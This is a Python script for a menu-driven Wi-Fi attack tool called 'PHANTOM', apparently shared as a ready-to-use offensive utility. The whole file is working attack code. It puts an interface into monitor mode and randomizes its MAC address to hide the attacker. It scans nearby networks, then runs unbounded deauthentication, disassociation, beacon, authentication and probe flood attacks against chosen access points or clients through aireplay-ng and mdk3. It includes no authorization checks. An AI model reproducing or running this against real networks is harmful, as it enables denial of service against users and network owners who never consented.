# ⛓ PHANTOM WI-FI DEAUTH TOOL WITH MULTI-ATTACK SUPPORT ⛓
# Author: Hrishav | Made w/❤️

import subprocess
import time
import shutil
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel
from rich import print
import os

console = Console()

REQUIRED_CMDS = {
    "airmon-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "iwconfig": "wireless-tools",
    "xterm": "xterm",
    "systemctl": "systemd",
    "macchanger": "macchanger"
}

def run_cmd(cmd, capture_output=False):
    result = subprocess.run(cmd, shell=True, text=True, capture_output=capture_output)
    return result.stdout.strip() if capture_output else None

def check_dependencies():
    console.print(Panel.fit("[bold bright_blue on black]⛓ PHANTOM DEPENDENCY CHECK ⛓[/bold bright_blue on black]"))
    missing = []
    for cmd, pkg in REQUIRED_CMDS.items():
        console.print(f"[bright_magenta]Checking[/bright_magenta] [bright_yellow]{cmd}[/bright_yellow]...")
        if shutil.which(cmd) is None:
            console.print(f"[bold bright_red]{cmd} MISSING[/bold bright_red] → Install: [bright_yellow]{pkg}[/bright_yellow]")
            missing.append(pkg)
        else:
            console.print(f"[bold bright_green]{cmd} FOUND[/bold bright_green]")
    if missing:
        unique_pkgs = sorted(set(missing))
        console.print(f"\n[bold bright_red]Installing:[/bold bright_red] [bright_yellow]{', '.join(unique_pkgs)}[/bright_yellow]")
        for pkg in unique_pkgs:
            result = subprocess.run(f"sudo apt install -y {pkg}", shell=True)
            if result.returncode != 0:
                console.print(f"[bold bright_red]FAILED to install {pkg}. EXITING.[/bold bright_red]")
                exit()
        console.print("[bold bright_green]✔ All dependencies installed![/bold bright_green]\n")
    else:
        console.print("[bold bright_blue]✔ All dependencies are present![/bold bright_blue]\n")

def list_interfaces():
    output = run_cmd("iwconfig", capture_output=True)
    interfaces = [line.split()[0] for line in output.splitlines() if "IEEE 802.11" in line]
    return interfaces

def choose_interface(interfaces):
    table = Table(title="[bold bright_blue]📡 Wireless Interfaces[/bold bright_blue]", header_style="bold bright_green")
    table.add_column("Index", style="bright_magenta")
    table.add_column("Interface", style="bright_white")
    for i, iface in enumerate(interfaces):
        table.add_row(str(i), iface)
    console.print(table)
    index = int(Prompt.ask("Select Interface Index"))
    return interfaces[index]

def enable_monitor_mode(interface):
    output = run_cmd(f"iwconfig {interface}", capture_output=True)
    if "Mode:Monitor" in output:
        console.print(f"[bold bright_green]Monitor mode already enabled on {interface}[/bold bright_green]")
        return interface
    console.print(f"\n[bold bright_red]Killing conflicting processes...[/bold bright_red]")
    run_cmd("sudo airmon-ng check kill")
    console.print(f"[bold bright_yellow]Enabling Monitor Mode on {interface}[/bold bright_yellow]")
    run_cmd(f"sudo airmon-ng start {interface}")
    return interface + "mon"

def randomize_mac(interface):
    console.print(f"\n[bold bright_yellow]Randomizing MAC for {interface}[/bold bright_yellow]")
    run_cmd(f"sudo ifconfig {interface} down")
    run_cmd(f"sudo macchanger -r {interface}")
    run_cmd(f"sudo ifconfig {interface} up")
    new_mac = run_cmd(f"macchanger -s {interface}", capture_output=True)
    console.print(f"[bold bright_cyan]New MAC Address:[/bold bright_cyan] [white]{new_mac}[/white]")

def show_attack_options():
    console.print(Panel.fit("[bold bright_cyan]Choose Your Attack[/bold bright_cyan]"))
    table = Table(show_lines=True, title="[bold bright_magenta]⚔ Attack Options ⚔[/bold bright_magenta]")
    table.add_column("Index", style="bright_yellow")
    table.add_column("Attack Type", style="bright_white")
    table.add_row("1", "Deauth Attack (Default)")
    table.add_row("2", "Beacon Flood (Random SSIDs)")
    table.add_row("3", "Auth/Assoc Flood")
    table.add_row("4", "Probe Request Flood")
    table.add_row("5", "RTS/CTS Flood")
    table.add_row("6", "Disassociation Attack")
    console.print(table)
    return int(Prompt.ask("Select Attack Index"))

def scan_networks(mon_iface):
    console.print("\n[bold bright_cyan]Launching Network Scanner...[/bold bright_cyan]")
    if os.path.exists("networks-01.csv"):
        os.remove("networks-01.csv")
    scan_script = f"""#!/bin/bash
echo "Scanning... Close window after 10 seconds."
sleep 2
sudo airodump-ng --write networks --output-format csv {mon_iface}
"""
    with open("phantom_scan.sh", "w") as f:
        f.write(scan_script)
    run_cmd("chmod +x phantom_scan.sh")
    subprocess.run('xterm -geometry 100x30 -T "PHANTOM NETWORK SCAN" -e ./phantom_scan.sh', shell=True)

    ssids = []
    try:
        with open("networks-01.csv", "r", encoding='utf-8', errors='ignore') as file:
            lines = file.readlines()
            parsing = False
            for line in lines:
                if line.strip() == "" and not parsing:
                    parsing = True
                    continue
                if parsing and line.strip():
                    parts = line.split(',')
                    if len(parts) > 13:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip() or "<Hidden>"
                        if bssid.lower() != "bssid":
                            ssids.append({"bssid": bssid, "channel": channel, "essid": essid})
    except FileNotFoundError:
        console.print("[bold bright_red]Scan failed or CSV file missing.[/bold bright_red]")
        return []

    if not ssids:
        console.print("[bold bright_red]No networks found. Try scanning again.[/bold bright_red]")
        return []

    table = Table(title="[bold bright_green]🌐 Networks Found[/bold bright_green]", header_style="bold bright_magenta")
    table.add_column("Index", style="bright_yellow")
    table.add_column("SSID", style="bright_white")
    table.add_column("BSSID", style="bright_cyan")
    table.add_column("Channel", style="bright_green")

    for idx, net in enumerate(ssids, start=1):
        table.add_row(str(idx), net["essid"], net["bssid"], net["channel"])

    console.print(table)
    index = int(Prompt.ask("Pick Network Index"))
    return ssids[index - 1]

def get_client_mac():
    mac = Prompt.ask("Enter [bright_cyan]Client MAC[/bright_cyan] (leave blank for all)")
    return mac.strip() if mac else None

def deauth_attack(mon_iface, bssid, channel, client_mac=None):
    run_cmd(f"sudo iwconfig {mon_iface} channel {channel}")
    console.print(f"\n[bold bright_red]⚠ Starting Infinite Deauth Attack on Channel {channel}...[/bold bright_red]")
    console.print(f"[bold bright_red]Press Ctrl+C to stop the attack[/bold bright_red]\n")
    try:
        if client_mac:
            subprocess.run(f"sudo aireplay-ng --deauth 0 -a {bssid} -c {client_mac} {mon_iface}", shell=True)
        else:
            subprocess.run(f"sudo aireplay-ng --deauth 0 -a {bssid} {mon_iface}", shell=True)
    except KeyboardInterrupt:
        console.print(f"\n[bold bright_red]Deauth stopped by user[/bold bright_red]")

def beacon_flood(mon_iface):
    console.print(f"[bold bright_red]⚠ Starting Beacon Flood with random SSIDs...[/bold bright_red]")
    try:
        subprocess.run(f"sudo mdk3 {mon_iface} b -n -s 100", shell=True)
    except KeyboardInterrupt:
        console.print(f"\n[bold bright_red]Flood stopped[/bold bright_red]")

def auth_assoc_flood(mon_iface, bssid, channel):
    run_cmd(f"sudo iwconfig {mon_iface} channel {channel}")
    console.print(f"[bold bright_red]⚠ Starting Authentication/Association Flood...[/bold bright_red]")
    try:
        subprocess.run(f"sudo mdk3 {mon_iface} a -a {bssid}", shell=True)
    except KeyboardInterrupt:
        console.print(f"\n[bold bright_red]Flood stopped[/bold bright_red]")

def probe_flood(mon_iface):
    console.print(f"[bold bright_red]⚠ Starting Probe Request Flood...[/bold bright_red]")
    try:
        subprocess.run(f"sudo mdk3 {mon_iface} p", shell=True)
    except KeyboardInterrupt:
        console.print(f"\n[bold bright_red]Flood stopped[/bold bright_red]")

def rts_cts_flood(mon_iface):
    console.print(f"[bold bright_red]⚠ Starting RTS/CTS Flood...[/bold bright_red]")
    try:
        subprocess.run(f"sudo mdk3 {mon_iface} r", shell=True)
    except KeyboardInterrupt:
        console.print(f"\n[bold bright_red]Flood stopped[/bold bright_red]")

def disassociation_attack(mon_iface, bssid, channel):
    run_cmd(f"sudo iwconfig {mon_iface} channel {channel}")
    console.print(f"[bold bright_red]⚠ Starting Disassociation Attack...[/bold bright_red]")
    try:
        subprocess.run(f"sudo aireplay-ng --deauth 0 -a {bssid} {mon_iface}", shell=True)
    except KeyboardInterrupt:
        console.print(f"\n[bold bright_red]Disassociation stopped[/bold bright_red]")

def restore_interface(interface):
    console.print(f"\n[bold bright_yellow]Restoring {interface} to managed mode...[/bold bright_yellow]")
    run_cmd(f"sudo airmon-ng stop {interface}")
    run_cmd("sudo systemctl restart NetworkManager")
    console.print(f"[bold bright_green]Interface restored. NetworkManager restarted.[/bold bright_green]")

def show_logo():
    logo = """
[bright_red]
 ██▓███   ██░ ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓
▓██░  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒
▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░
▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██    ▒██ 
▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒
▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░
░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░  ░      ░
░░        ░  ░░ ░  ░   ▒      ░   ░ ░   ░      ░ ░ ░ ▒  ░      ░   
          ░  ░  ░      ░  ░         ░              ░ ░         ░   
[/bright_red]
[bold italic bright_white]                 Made w/❤️  by Hrishav[bold italic bright_white]
    """
    console.print(logo, justify="center")

def main():
    show_logo()
    time.sleep(1)
    check_dependencies()
    interfaces = list_interfaces()
    if not interfaces:
        console.print("[bold bright_red]No wireless interfaces detected![/bold bright_red]")
        return

    iface = choose_interface(interfaces)
    mon_iface = enable_monitor_mode(iface)
    randomize_mac(mon_iface)

    attack_choice = show_attack_options()

    if attack_choice == 1:
        target = scan_networks(mon_iface)
        if not target:
            return
        client_mac = get_client_mac()
        deauth_attack(mon_iface, target["bssid"], target["channel"], client_mac)
    elif attack_choice == 2:
        beacon_flood(mon_iface)
    elif attack_choice == 3:
        target = scan_networks(mon_iface)
        if target:
            auth_assoc_flood(mon_iface, target["bssid"], target["channel"])
    elif attack_choice == 4:
        probe_flood(mon_iface)
    elif attack_choice == 5:
        rts_cts_flood(mon_iface)
    elif attack_choice == 6:
        target = scan_networks(mon_iface)
        if target:
            disassociation_attack(mon_iface, target["bssid"], target["channel"])
    else:
        console.print("[bold bright_red]Invalid attack choice![/bold bright_red]")

    restore_interface(mon_iface)

if __name__ == "__main__":
    main()
